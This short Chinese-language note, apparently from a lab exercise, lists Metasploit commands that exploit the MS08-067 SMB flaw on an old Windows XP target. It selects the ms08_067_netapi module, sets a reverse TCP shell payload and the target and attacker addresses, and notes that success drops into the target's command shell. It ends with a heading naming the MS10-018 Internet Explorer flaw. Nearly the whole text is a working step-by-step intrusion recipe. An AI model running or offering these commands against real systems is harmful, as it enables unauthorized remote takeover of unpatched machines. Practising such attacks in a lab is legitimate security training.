xshell中
msfconsole
//靶机是xp pro很老的版本，ms08_067利用445端口漏洞
msf> use exploit/windows/smb/ms08_067_netapi
msf> set payload generic/shell_reverse_tcp
msf> show options //显示需要配置哪些东西
msf> set RHOST 192.168.253.132 // 靶机ip
msf> set LHOST 192.168.253.130 // 本机ip
msf> run //开始攻击，如果成功会进入靶机的cmd
//进入cmd后，ctrl+brackspace才是退格 ctrl+\是返回主机
//////////////////////////////////////////////////////////////////////
ms10_018浏览器（ie6 ie7）漏洞
